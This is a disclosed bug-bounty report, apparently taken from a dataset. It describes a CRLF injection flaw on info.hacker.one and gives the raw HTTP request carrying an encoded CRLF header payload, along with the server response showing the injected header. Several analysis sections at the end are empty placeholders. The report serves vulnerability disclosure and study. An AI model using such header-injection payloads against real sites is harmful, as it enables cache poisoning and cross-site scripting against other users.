---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '217058'
original_report_id: '217058'
title: CRLF injection in info.hacker.one
weakness: CRLF Injection
team_handle: security
created_at: '2017-03-29T18:19:16.560Z'
disclosed_at: '2017-05-03T17:06:18.996Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
tags:
- hackerone
- crlf-injection
---

# CRLF injection in info.hacker.one

## Metadata

- HackerOne Report ID: 217058
- Weakness: CRLF Injection
- Program: security
- Disclosed At: 2017-05-03T17:06:18.996Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Vulnerable URL:
info.hacker.one

Vulnerability description
This script is possibly vulnerable to CRLF injection attacks. 

HTTP headers have the structure "Key: Value", where each line is separated by the CRLF combination. If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.
HTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.


URI was set to headername: headervalue
Injected header found: 

headername: headervalue


Request
GET /%0d%0a%09headername:%20headervalue HTTP/1.1
Host: info.hacker.one
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

Response
HTTP/1.1 301 Moved Permanently
Date: Wed, 29 Mar 2017 18:11:47 GMT
Location: http://info.hacker.one/
headername: headervalue/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-07ebf0a99d.ap-southeast-1.unbounce.net
Content-Length: 0
Connection: keep-alive

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
